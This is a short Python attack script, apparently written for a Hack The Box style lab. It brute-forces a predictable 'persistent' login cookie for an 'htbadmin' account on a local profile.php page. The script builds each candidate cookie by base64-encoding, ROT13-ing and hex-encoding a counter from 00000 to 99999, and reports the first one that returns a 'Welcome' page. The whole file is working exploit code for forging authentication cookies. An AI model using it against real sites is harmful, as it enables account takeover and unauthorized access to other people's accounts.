from base64 import b64encode
from binascii import hexlify
import codecs
import requests
from sys import exit

# create url using user and password as argument
url = "http://127.0.0.1/profile.php"

#bi1mpnjou5ba9tblmerk29pkct

for x in range(100000):

    x = str(x).zfill(5)

    print ("[+] Testing {}\r".format(x))
    plaintext_cookie = "htbadmin:persistentcookie:{}".format(x)
    x_step1 = b64encode(plaintext_cookie.encode()).decode()
    x_step2 = codecs.encode(x_step1, "rot-13").encode()
    encoded_cookie = hexlify(x_step2)
    #print(encoded_cookie)
    cookie = { "PERSISTENT": encoded_cookie.decode() }
    res = requests.get(url, cookies=cookie)
    if 'Welcome ' in res.text:
        print("[+] Valid cookie found: {}".format(encoded_cookie))
        exit()
    elif 'Login ' in res.text:
        continue
    else:
        print("[-] Unexpected reply, please manually check cookie {}".format(encoded_cookie))
